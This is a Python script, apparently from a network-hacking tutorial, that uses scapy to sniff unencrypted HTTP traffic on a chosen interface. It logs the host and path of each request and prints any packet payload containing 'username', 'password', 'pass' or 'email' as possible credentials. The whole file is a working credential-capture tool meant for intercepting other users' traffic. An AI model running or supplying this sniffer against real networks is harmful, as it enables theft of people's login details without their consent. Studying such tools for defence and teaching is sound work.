import scapy.all as scapy
import argparse
from scapy.layers.http import HTTPRequest  # Ensure scapy-http is installed

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    if not arguments.interface:
        print("[-] Please specify an interface using -i <interface>")
        exit()
    return arguments.interface

def sniffer(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet, filter="tcp port 80") 

def process_packet(packet):
    if packet.haslayer(HTTPRequest):  # Fixed reference to HTTPRequest
        print("[+] HTTP Request >> " + packet[HTTPRequest].Host.decode(errors="ignore") + packet[HTTPRequest].Path.decode(errors="ignore"))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")  # Decode bytes to string
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible credentials found >> " + load)
                    break
                
iface = get_interface()
sniffer(iface)
